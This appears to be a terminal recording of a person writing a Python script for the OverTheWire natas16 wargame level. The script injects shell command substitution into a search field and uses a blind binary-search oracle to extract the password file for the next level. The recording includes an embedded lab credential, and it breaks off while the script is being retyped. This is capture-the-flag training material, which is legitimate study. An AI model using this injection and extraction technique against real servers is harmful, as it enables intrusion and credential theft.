[14.91047, "o", "\u001b[?1049h\u001b[22;0;0t\u001b[>4;2m\u001b[?1h\u001b=\u001b[?2004h\u001b[1;34r\u001b[?12h\u001b[?12l\u001b[22;2t\u001b[22;1t\u001b[27m\u001b[23m\u001b[29m\u001b[m\u001b[H\u001b[2J\u001b[?25l\u001b[34;1H\"/tmp/n16grep.py\" 28 lines, 1229 bytes\u001b[14t\u001b[16t\u001b[1;1Himport urllib.request, urllib.parse, base64\r\r\n# natas16: $(...) command substitution survives the filter. The oracle: if the\r\r\n# grep pattern matches the password prefix, grep outputs only the password line\r\r\n# (the dictionary words no longer match the whole line) -> the surrounding\r\r\n# output is empty; otherwise the dictionary dump appears.\r\r\nurl = \"http://natas16.natas.labs.overthewire.org/\"\r\r\nauth = \"Basic \" + base64.b64encode(b\"natas16:Xm6XEeRN3zsGjRDqBPmuqAVV65k7e3Gb\").decode()\r\r\nCHARS = \"0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz\"\r\r\ndef empty(payload):\r\r\n    d = urllib.parse.urlencode({\"needle\": payload}).encode()\r\r\n    r = urllib.request.Request(url, data=d, headers={\"Authorization\": auth})\r\r\n    body = urllib.request.urlopen(r, timeout=30).read().decode(\"utf-8\", \"replace\")\r\r\n    i = body.find(\"<pre>\")\r\r\n    j = body.find(\"</pre>\", i)\r\r\n    return len(body[i+5:j].strip()) == 0\r\r\nprefix = \"\"\r\r\nfor pos in range(1, 40):\r\r\n    lo, hi = 0, len(CHARS) - 1\r\r\n    while lo < hi:\u001b[20;9Hmid = (lo + hi) // 2\u001b[21;9Hif empty(f\"$(grep ^{prefix}[{CHARS[lo:mid+1]}] /etc/natas_webpass/natas17)\"):\u001b[22;13Hhi = mid\u001b[23;9Helse:\u001b[24;13Hlo = mid + 1\r\r\n    prefix += CHARS[lo]\r\r\n    print(prefix, flush=True)\r\r\nprint(\"FINAL\", prefix)\r\r\n\r\r\n\u001b[1m\u001b[34m~                                                                                                             \u001b[30;1H~                                                                                                             \u001b[31;1H~                                                                                                             \u001b[32;1H~                                                                                                             \u001b[33;1H~                                                                                                             \u001b[?25h\u001b[1;1H\u001b[?4m"]
[34.156302, "o", "\u0007\u001b[?25l\u001b[m\u001b[34;1H\u001b[K\u001b[34;1H:set noai nocin nosi indentexpr=\r\u001b[1;1H\u001b[?25h\u001b[?25l\u001b[1;1H\u001b[K\u001b[2;1H\u001b[1m\u001b[34m~                                                                                                             \u001b[3;1H~                                                                                                             \u001b[4;1H~                                                                                                             \u001b[5;1H~                                                                                                             \u001b[6;1H~                                                                                                             \u001b[7;1H~                                                                                                             \u001b[8;1H~                                                                                                             \u001b[9;1H~                                                                                                             \u001b[10;1H~                                                                                                             \u001b[11;1H~                                                                                                             \u001b[12;1H~                                                                                                             \u001b[13;1H~                                                                                                             \u001b[14;1H~                                                                                                             \u001b[15;1H~                                                                                                             \u001b[16;1H~                                                                                                             \u001b[17;1H~                                                                                                             \u001b[18;1H~                                                                                                             \u001b[19;1H~                                                                                                             \u001b[20;1H~                                                                                                             \u001b[21;1H~                                                                                                             \u001b[22;1H~                                                                                                             \u001b[23;1H~                                                                                                             \u001b[24;1H~                                                                                                             \u001b[25;1H~                                                                                                             \u001b[26;1H~                                                                                                             \u001b[27;1H~                                                                                                             \u001b[28;1H~                                                                                                             \u001b[?25h\u001b[?25l\u001b[m\u001b[34;1H--No lines in buffer--\u001b[34;23H\u001b[K\u001b[1;1H\u001b[?25h\u001b[?2004l\u001b[>4;m\u001b[?25li\u001b[?25h\u001b[?25lm\u001b[?25h\u001b[?25lp\u001b[?25h\u001b[?25lo\u001b[?25h\u001b[?25lr\u001b[?25h\u001b[?25lt\u001b[?25h\u001b[?25l\u001b[?25h \u001b[?25lu\u001b[?25h\u001b[?25lr\u001b[?25h\u001b[?25ll\u001b[?25h\u001b[?25ll\u001b[?25h\u001b[?25li\u001b[?25h\u001b[?25lb\u001b[?25h\u001b[?25l.\u001b[?25h\u001b[?25lr\u001b[?25h\u001b[?25le\u001b[?25h\u001b[?25lq\u001b[?25h\u001b[?25lu\u001b[?25h\u001b[?25le\u001b[?25h\u001b[?25ls\u001b[?25h\u001b[?25lt\u001b[?25h\u001b[?25l,\u001b[?25h\u001b[?25l\u001b[?25h \u001b[?25lu\u001b[?25h\u001b[?25lr\u001b[?25h\u001b[?25ll\u001b[?25h\u001b[?25ll\u001b[?25h\u001b[?25li\u001b[?25h\u001b[?25lb\u001b[?25h\u001b[?25l.\u001b[?25h\u001b[?25lp\u001b[?25h\u001b[?25la\u001b[?25h\u001b[?25lr\u001b[?25h\u001b[?25ls\u001b[?25h\u001b[?25le\u001b[?25h\u001b[?25l,\u001b[?25h\u001b[?25l\u001b[?25h \u001b[?25lb\u001b[?25h\u001b[?25la\u001b[?25h\u001b[?25ls\u001b[?25h\u001b[?25le\u001b[?25h\u001b[?25l6\u001b[?25h\u001b[?25l4\u001b[?25h\u001b[?25l\u001b[2;1H\u001b[K\u001b[?25h\u001b[2;1H\u001b[?25l#\u001b[?25h\u001b[?25l\u001b[?25h \u001b[?25ln\u001b[?25h\u001b[?25la\u001b[?25h\u001b[?25lt\u001b[?25h\u001b[?25la\u001b[?25h\u001b[?25ls\u001b[?25h\u001b[?25l1\u001b[?25h\u001b[?25l6\u001b[?25h\u001b[?25l:\u001b[?25h\u001b[?25l\u001b[?25h \u001b[?25l$\u001b[?25h\u001b[?25l(\u001b[?25h\u001b[?25l.\u001b[?25h\u001b[?25l.\u001b[?25h\u001b[?25l.\u001b[?25h\u001b[?25l)\u001b[?25h\u001b[?25l\u001b[?25h \u001b[?25lc\u001b[?25h\u001b[?25lo\u001b[?25h\u001b[?25lm\u001b[?25h\u001b[?25lm\u001b[?25h\u001b[?25la\u001b[?25h\u001b[?25ln\u001b[?25h\u001b[?25ld\u001b[?25h\u001b[?25l\u001b[?25h \u001b[?25ls\u001b[?25h\u001b[?25lu\u001b[?25h\u001b[?25lb\u001b[?25h\u001b[?25ls\u001b[?25h\u001b[?25lt\u001b[?25h\u001b[?25li\u001b[?25h\u001b[?25lt\u001b[?25h\u001b[?25lu\u001b[?25h\u001b[?25lt\u001b[?25h\u001b[?25li\u001b[?25h\u001b[?25lo\u001b[?25h\u001b[?25ln\u001b[?25h\u001b[?25l\u001b[?25h \u001b[?25ls\u001b[?25h\u001b[?25lu\u001b[?25h\u001b[?25lr\u001b[?25h\u001b[?25lv\u001b[?25h\u001b[?25li\u001b[?25h\u001b[?25lv\u001b[?25h\u001b[?25le\u001b[?25h\u001b[?25ls\u001b[?25h\u001b[?25l\u001b[?25h \u001b[?25lt\u001b[?25h\u001b[?25lh\u001b[?25h\u001b[?25le\u001b[?25h\u001b[?25l\u001b[?25h \u001b[?25lf\u001b[?25h\u001b[?25li\u001b[?25h\u001b[?25ll\u001b[?25h\u001b[?25lt\u001b[?25h\u001b[?25le\u001b[?25h\u001b[?25lr\u001b[?25h\u001b[?"]
